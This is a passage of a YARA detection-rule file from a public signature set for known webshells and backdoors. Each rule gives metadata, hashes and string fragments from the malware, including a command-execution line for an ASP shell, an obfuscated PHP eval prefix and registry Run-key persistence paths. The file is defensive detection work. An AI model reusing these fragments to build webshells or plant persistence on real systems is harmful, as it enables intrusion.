		hash0 = "5622c9841d76617bfc3cd4cab1932d8349b7044f"
		hash1 = "4a20f36035bbae8e342aab0418134e750b881d05"
		hash2 = "40dbdc0bdf5218af50741ba011c5286a723fa9bf"

	strings:
		$s1 = "// me at pentestmonkey@pentestmonkey.net" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Unpack_Injectt
{
	meta:
		description = "Webshells Auto-generated - file Injectt.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "80dc3086-41a6-5e30-bbf4-463500fe5e33"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7138-L7151"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "8a5d2158a566c87edc999771e12d42c5"
		logic_hash = "d8e9ed4f2604617bd6410f36ab827affa3cc6729ba996d0d9cd9c8eb0fd96533"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "%s -Run                              -->To Install And Run The Service"
		$s3 = "%s -Uninstall                        -->To Uninstall The Service"
		$s4 = "(STANDARD_RIGHTS_REQUIRED |SC_MANAGER_CONNECT |SC_MANAGER_CREATE_SERVICE |SC_MAN"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop_Devpack_Fso
{
	meta:
		description = "Webshells Auto-generated - file fso.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "094eeff9-0da0-5a44-a45c-f8ee57861e7a"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7152-L7164"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b37f3cde1a08890bd822a182c3a881f6"
		logic_hash = "9d071c1e2e0725091a2abe24759e6e71d78e29caa76b4fff77c44e3bb381b1a2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<!-- PageFSO Below -->"
		$s1 = "theFile.writeLine(\"<script language=\"\"vbscript\"\" runat=server>if request(\"\"\"&cli"

	condition:
		all of them
}

rule SIGNATURE_BASE_Felikspack3___PHP_Shells_Ssh
{
	meta:
		description = "Webshells Auto-generated - file ssh.php"
		author = "Florian Roth (Nextron Systems)"
		id = "0b971065-df16-5092-beff-c55608447f19"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7165-L7176"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "1aa5307790d72941589079989b4f900e"
		logic_hash = "40c5a5d1d714947454f4aa9f7ed09d777cb60c23933201ac8eaf0d49452af8c6"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "eval(gzinflate(str_rot13(base64_decode('"

	condition:
		all of them
}

rule SIGNATURE_BASE_Debug_Bdoor
{
	meta:
		description = "Webshells Auto-generated - file BDoor.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "0938efe7-2b6d-5749-af9a-967cca85defb"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7177-L7189"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "e4e8e31dd44beb9320922c5f49739955"
		logic_hash = "ed8caeb96a6fc48fe23d5db078bbb8ba5aec3c5d4ee382cbc6bc4e01630f1460"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "\\BDoor\\"
		$s4 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"

	condition:
		all of them
}

rule SIGNATURE_BASE_Bin_Client
{
	meta:
		description = "Webshells Auto-generated - file Client.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "8564d787-5edc-59b0-b1ef-2f33c8a24f82"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7190-L7204"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "5f91a5b46d155cacf0cc6673a2a5461b"
		logic_hash = "28ce9aa136b5d41bb580e6b5b8580d3ccbb7eeec31007e68241d23c5a0f40d40"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Recieved respond from server!!"
		$s4 = "packet door client"
		$s5 = "input source port(whatever you want):"
		$s7 = "Packet sent,waiting for reply..."

	condition:
		all of them
}

rule SIGNATURE_BASE_Zxshell2_0_Rar_Folder_Zxshell
{
	meta:
		description = "Webshells Auto-generated - file ZXshell.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "621ac87e-b1f8-58d7-9328-54af5ca9b605"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7205-L7217"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "246ce44502d2f6002d720d350e26c288"
		logic_hash = "72eaf90551144eccb7329e0a0e05bcc955ea2bfdb37aa87e9cae7b5f5a26bea0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "WPreviewPagesn"
		$s1 = "DA!OLUTELY N"

	condition:
		all of them
}

rule SIGNATURE_BASE_Rkntload
{
	meta:
		description = "Webshells Auto-generated - file RkNTLoad.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "fd4b1343-5fa9-5ad8-bee1-6b06b93ddfbe"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7218-L7236"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "262317c95ced56224f136ba532b8b34f"
		logic_hash = "ab767a7016318633055a85195ca2bab08a8c68222d46018aaf8772ab27a373c4"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$Info: This file is packed with the UPX executable packer http://upx.tsx.org $"
		$s2 = "5pur+virtu!"
		$s3 = "ugh spac#n"
		$s4 = "xcEx3WriL4"
		$s5 = "runtime error"
		$s6 = "loseHWait.Sr."
		$s7 = "essageBoxAw"
		$s8 = "$Id: UPX 1.07 Copyright (C) 1996-2001 the UPX Team. All Rights Reserved. $"

	condition:
		all of them
}

rule SIGNATURE_BASE_Binder2_Binder2
{
	meta:
		description = "Webshells Auto-generated - file binder2.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "29269dc0-f2e4-56ec-ad64-0dff00e339b7"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7237-L7253"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "d594e90ad23ae0bc0b65b59189c12f11"
		logic_hash = "fbe56b7d37fc7863fcf55761c0b5b671d661a713ac95f90d65b79eee9a447a9b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "IsCharAlphaNumericA"
		$s2 = "WideCharToM"
		$s4 = "g 5pur+virtu!"
		$s5 = "\\syslog.en"
		$s6 = "heap7'7oqk?not="
		$s8 = "- Kablto in"

	condition:
		all of them
}

rule SIGNATURE_BASE_Thelast_Orice2
{
	meta:
		description = "Webshells Auto-generated - file orice2.php"
		author = "Florian Roth (Nextron Systems)"
		id = "968cef9e-0163-5f4a-91e3-07510f9f4fcd"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7254-L7266"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "aa63ffb27bde8d03d00dda04421237ae"
		logic_hash = "075f3377a9b90c6c1ba74682415b9c0832a839afe647fa6d3c85d4e987618405"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = " $aa = $_GET['aa'];"
		$s1 = "echo $aa;"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Sincap
{
	meta:
		description = "Webshells Auto-generated - file sincap.php"
		author = "Florian Roth (Nextron Systems)"
		id = "fcee20a3-e71b-5f69-ac67-8660fd270703"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7267-L7279"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "dc5c2c2392b84a1529abd92e98e9aa5b"
		logic_hash = "705030e93248f5ea6744f78bd7a1816aaa9772880059286b8d686e05b193d4a0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "    <font color=\"#E5E5E5\" style=\"font-size: 8pt; font-weight: 700\" face=\"Arial\">"
		$s4 = "<body text=\"#008000\" bgcolor=\"#808080\" topmargin=\"0\" leftmargin=\"0\" rightmargin="

	condition:
		all of them
}

rule SIGNATURE_BASE_Phpshell
{
	meta:
		description = "Webshells Auto-generated - file PhpShell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "887264d3-5704-5e38-b0a6-44d529258ea2"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7280-L7291"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "539baa0d39a9cf3c64d65ee7a8738620"
		logic_hash = "95b3cedac370bf9b06092035a738722f3ec97e6cbafe3d4f742429a865576ad8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "href=\"http://www.gimpster.com/wiki/PhpShell\">www.gimpster.com/wiki/PhpShell</a>."

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop_Devpack_Config
{
	meta:
		description = "Webshells Auto-generated - file config.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "da1b8ce1-8b17-53f6-a86b-ad3fe918084e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7292-L7305"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b41d0e64e64a685178a3155195921d61"
		logic_hash = "b2806c30db413bca518943352f233c9d2915356a41eceed5e352b88ee34fbbd3"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "const adminPassword=\""
		$s2 = "const userPassword=\""
		$s3 = "const mVersion="

	condition:
		all of them
}

rule SIGNATURE_BASE_Sendmail
{
	meta:
		description = "Webshells Auto-generated - file sendmail.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "dd33c2bb-61bf-57b7-82b9-d864097f7a56"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7306-L7318"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "75b86f4a21d8adefaf34b3a94629bd17"
		logic_hash = "bcca9a9380d2695bc277afc9fa72c24cb26ac44c6fbcc87113b017cfe190bdab"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "_NextPyC808"
		$s6 = "Copyright (C) 2000, Diamond Computer Systems Pty. Ltd. (www.diamondcs.com.au)"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Zehir4
{
	meta:
		description = "Webshells Auto-generated - file zehir4.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "9f1adcd6-b721-54ef-a20f-c3a353629a40"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7319-L7330"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "5b496a61363d304532bcf52ee21f5d55"
		logic_hash = "6bcfb1ee40403394bf996ecbe1bb17f9afa0c3ba9e1906881b94bbc785b4a510"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = " byMesaj "

	condition:
		all of them
}

rule SIGNATURE_BASE_Hkshell_Hkshell
{
	meta:
		description = "Webshells Auto-generated - file hkshell.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "7436cd7c-7027-56dc-bb62-fac0f70c27d8"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7331-L7344"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "168cab58cee59dc4706b3be988312580"
		logic_hash = "bee4d4c957ede41c771d690d52ac2fd3655238cc1fc106d30fb2721084b38aa1"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "PrSessKERNELU"
		$s2 = "Cur3ntV7sion"
		$s3 = "Explorer8"

	condition:
		all of them
}

rule SIGNATURE_BASE_Imhapftp
{
	meta:
		description = "Webshells Auto-generated - file iMHaPFtp.php"
		author = "Florian Roth (Nextron Systems)"
		id = "c810c630-ce08-5059-ad49-f65b244f4d19"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7345-L7356"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "12911b73bc6a5d313b494102abcf5c57"
		logic_hash = "c24bb80a0ae4284b4303450e9103c5dda30c41b41f323641ac1175461f741ced"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "echo \"\\t<th class=\\\"permission_header\\\"><a href=\\\"$self?{$d}sort=permission$r\\\">"

	condition:
		all of them
}

rule SIGNATURE_BASE_Unpack_Tback
{
	meta:
		description = "Webshells Auto-generated - file TBack.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "b5f93621-e1e9-5aed-b574-471b4c1f9570"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7357-L7368"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "a9d1007823bf96fb163ab38726b48464"
		logic_hash = "0fb43766c305f4235cc0987f411fdc3b3674723687f0b63d346429f4a7b5b87f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "\\final\\new\\lcc\\public.dll"

	condition:
		all of them
}

rule SIGNATURE_BASE_Darkspy105
{
	meta:
		description = "Webshells Auto-generated - file DarkSpy105.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "9d519ccf-fe52-5b82-a39d-c9f86c1089e1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7369-L7380"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "f0b85e7bec90dba829a3ede1ab7d8722"
		logic_hash = "0f1c9dba4525f9c30f309500652ed6af647ddf492f483e101fc23c891e15fc85"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "Sorry,DarkSpy got an unknown exception,please re-run it,thanks!"

	condition:
		all of them
}

rule SIGNATURE_BASE_Editserver_EXE
{
	meta:
		description = "Webshells Auto-generated - file EditServer.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "97928144-0112-5288-8f95-acf7a0d56e71"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7381-L7394"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "f945de25e0eba3bdaf1455b3a62b9832"
		logic_hash = "d440669b0c0bf575cf9dea946edf55f724300a4c765e90c631fc1eee062bf006"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "Server %s Have Been Configured"
		$s5 = "The Server Password Exceeds 32 Characters"
		$s8 = "9--Set Procecess Name To Inject DLL"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Reader
{
	meta:
		description = "Webshells Auto-generated - file reader.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "d596f7f4-5b0d-5f17-94d3-2582ec041eb1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7395-L7406"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b598c8b662f2a1f6cc61f291fb0a6fa2"
		logic_hash = "89a948f8da66173965884cd525615c8eeb91cf98a4984c05be7472034bb72f76"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "mailto:mailbomb@hotmail."

	condition:
		all of them
}

rule SIGNATURE_BASE_ASP_Cmdasp
{
	meta:
		description = "Webshells Auto-generated - file CmdAsp.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "e4b48843-1936-5717-b2b6-add5b4a14d04"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7407-L7420"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "79d4f3425f7a89befb0ef3bafe5e332f"
		logic_hash = "84c3148fe74b1afaa6e3bbff0aca8df1f1775759a36a673cc13d35ef7658929c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "' -- Read the output from our command and remove the temp file -- '"
		$s6 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)"
		$s9 = "' -- create the COM objects that we will be using -- '"

	condition:
		all of them
}

rule SIGNATURE_BASE_KA_Ushell
{
	meta:
		description = "Webshells Auto-generated - file KA_uShell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "34e220db-2fb5-59dc-b5e8-d88f844d3977"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7421-L7433"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "685f5d4f7f6751eaefc2695071569aab"
		logic_hash = "58d25e19e2e14a909b4b623a85dfd8c62974121d3b23574d1e94b62385e42b45"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "if(empty($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_PW']<>$pass"
		$s6 = "if ($_POST['path']==\"\"){$uploadfile = $_FILES['file']['name'];}"

	condition:
		all of them
}

rule SIGNATURE_BASE_PHP_Backdoor_V1
{
	meta:
		description = "Webshells Auto-generated - file PHP Backdoor v1.php"
		author = "Florian Roth (Nextron Systems)"
		id = "f47298a9-a47c-5088-ab1f-1bd76bfd0ca8"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7434-L7447"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "0506ba90759d11d78befd21cabf41f3d"
		logic_hash = "396ae1ee34a06ab4863f4f54257a9020b8747fb99dff15372f0aa54fa4598e43"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "echo\"<form method=\\\"POST\\\" action=\\\"\".$_SERVER['PHP_SELF'].\"?edit=\".$th"
		$s8 = "echo \"<a href=\\\"\".$_SERVER['PHP_SELF'].\"?proxy"

	condition:
		all of them
}

rule SIGNATURE_BASE_Svchostdll
{
	meta:
		description = "Webshells Auto-generated - file svchostdll.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "b369d702-1f29-56ec-a742-f87d9c42c775"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7448-L7467"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "0f6756c8cb0b454c452055f189e4c3f4"
		logic_hash = "4a7a7bb7d827c2e7801f8c33b292bb3d312428fc4ae79f07e103f456984c3b83"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "InstallService"
		$s1 = "RundllInstallA"
		$s2 = "UninstallService"
		$s3 = "&G3 Users In RegistryD"
		$s4 = "OL_SHUTDOWN;I"
		$s5 = "SvcHostDLL.dll"
		$s6 = "RundllUninstallA"
		$s7 = "InternetOpenA"
		$s8 = "Check Cloneomplete"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop_Devpack_Server
{
	meta:
		description = "Webshells Auto-generated - file server.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "0e4fee1b-8a16-5738-9600-fa965f8c84c2"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7468-L7479"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "1d38526a215df13c7373da4635541b43"
		logic_hash = "66b8513a532f64af535c948da28674795ae6495b9844165c3b039bf61c25eb46"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<!-- PageServer Below -->"

	condition:
		all of them
}

rule SIGNATURE_BASE_Vanquish
{
	meta:
		description = "Webshells Auto-generated - file vanquish.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "143e5e46-ffbc-5aee-9f9b-13374a6c3c10"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7480-L7493"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "684450adde37a93e8bb362994efc898c"
		logic_hash = "223c59d06a9389f380fa29959c54e53a17b53080f704189ae519b9527b2c6384"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "You cannot delete protected files/folders! Instead, your attempt has been logged"
		$s8 = "?VCreateProcessA@@YGHPBDPADPAU_SECURITY_ATTRIBUTES@@2HKPAX0PAU_STARTUPINFOA@@PAU"
		$s9 = "?VFindFirstFileExW@@YGPAXPBGW4_FINDEX_INFO_LEVELS@@PAXW4_FINDEX_SEARCH_OPS@@2K@Z"

	condition:
		all of them
}

rule SIGNATURE_BASE_Winshell
{
	meta:
		description = "Webshells Auto-generated - file winshell.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "24edd03a-df71-5d84-9764-ba7903b68064"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7494-L7513"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "3144410a37dd4c29d004a814a294ea26"
		logic_hash = "addbfa598039af09c0e4c50138fcfabd16c35c5516259cf9595cf49855da518d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices"
		$s1 = "WinShell Service"
		$s2 = "__GLOBAL_HEAP_SELECTED"
		$s3 = "__MSVCRT_HEAP_SELECT"
		$s4 = "Provide Windows CmdShell Service"
		$s5 = "URLDownloadToFileA"
		$s6 = "RegisterServiceProcess"
		$s7 = "GetModuleBaseNameA"
		$s8 = "WinShell v5.0 (C)2002 janker.org"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Remview
{
	meta:
		description = "Webshells Auto-generated - file remview.php"
		author = "Florian Roth (Nextron Systems)"
		id = "5040ddbc-2e61-50ca-b738-a4ac8feec3f1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7514-L7527"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
